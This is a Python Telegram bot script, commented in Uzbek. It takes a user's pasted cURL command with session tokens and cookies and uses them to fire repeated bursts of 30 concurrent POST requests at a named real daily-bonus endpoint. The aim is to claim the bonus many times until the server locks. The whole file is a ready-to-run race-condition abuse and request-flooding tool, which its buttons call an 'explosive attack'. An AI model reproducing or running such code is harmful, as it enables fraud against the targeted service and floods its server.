from flask import Flask
import threading
import telebot
from telebot import types
import requests
import time
import os
import re
import json
import concurrent.futures

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask('')

@app.route('/')
def home():
    return "Bot yoniq va URL avtomatlashtirildi!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

users_data = {}
lock = threading.Lock()

# SIZ AYTGAN ASOSIY BONUS URL
TARGET_URL = "https://aladdin.1it.uz/v3/daily/appoint"

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum")
    btn2 = types.KeyboardButton("🛑 To'xtatish")
    btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
    markup.add(btn1, btn2, btn3)
    return markup

def parse_curl_flexible(curl_text):
    """Ixtiyoriy cURLdan sarlavhalarni ajratib oladi va Bonus URLga moslaydi"""
    try:
        # Headerlarni (token, cookie va h.k.) ajratish
        headers = {}
        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
        for k, v in header_matches:
            headers[k.strip()] = v.strip()

        # Data (userId) ni ajratish (agar koddagi data kerak bo'lsa)
        data = None
        data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
        if data_match:
            data = json.loads(data_match.group(1))

        if headers:
            # URL har doim siz aytgan manzilga o'zgaradi
            return {"url": TARGET_URL, "headers": headers, "data": data, "is_running": False}
    except Exception:
        return None
    return None

def attack(chat_id):
    user = users_data.get(chat_id)
    if not user: return
    
    session = requests.Session()
    bot.send_message(chat_id, "🌪 Sinxron hujum boshlandi! Ixtiyoriy cURL ma'lumotlari Bonus URLga yo'naltirildi.")
    
    success_count = 0
    lock_count = 0

    def send_req():
        nonlocal success_count, lock_count
        if not user.get("is_running"): return
        try:
            # Hujum siz aytgan TARGET_URL ga ketadi
            resp = session.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
            if resp.status_code == 200:
                success_count += 1
            elif resp.status_code == 423:
                lock_count += 1
        except:
            pass

    while user.get("is_running"):
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(send_req) for _ in range(30)]
            concurrent.futures.wait(futures)
            
        if lock_count > 0:
            bot.send_message(chat_id, f"⚠️ Server yopildi (423).\n✅ Olingan bonuslar: **{success_count}** ta!", parse_mode="Markdown")
            user["is_running"] = False
            break
            
        time.sleep(0.1)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 **Bonus ovchisi (Flexible URL)**\n\nIstalgan tugmadan olingan cURLni tashlang, bot uni avtomatik ravishda bonus olishga yo'naltiradi.", reply_markup=get_main_menu())

@bot.message_handler(func=lambda message: message.text.startswith("curl "))
def handle_curl(message):
    parsed = parse_curl_flexible(message.text)
    if parsed:
        users_data[message.chat.id] = parsed
        bot.reply_to(message, "✅ cURL qabul qilindi! Headerlar saqlandi va Bonus URLga sozlandi.")
    else:
        bot.reply_to(message, "❌ Xatolik! cURLdan headerlarni olib bo'lmadi.")

@bot.message_handler(func=lambda message: message.text in ["🚀 Portlovchi Hujum", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
def handle_menu(message):
    chat_id = message.chat.id
    user = users_data.get(chat_id)

    if message.text == "🚀 Portlovchi Hujum":
        if not user:
            bot.send_message(chat_id, "Oldin `cURL` yuboring!")
            return
        with lock:
            if user.get("is_running"): return
            user["is_running"] = True
        threading.Thread(target=attack, args=(chat_id,), daemon=True).start()

    elif message.text == "🛑 To'xtatish":
        if user: user["is_running"] = False
        bot.send_message(chat_id, "🛑 To'xtatildi.")

    elif message.text == "⚙️ Sozlamalarni ko'rish":
        if user:
            bot.send_message(chat_id, f"📊 Holat: {'🟢' if user['is_running'] else '🔴'}\nManzil: `{TARGET_URL}`", parse_mode="Markdown")

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    bot.polling(none_stop=True)
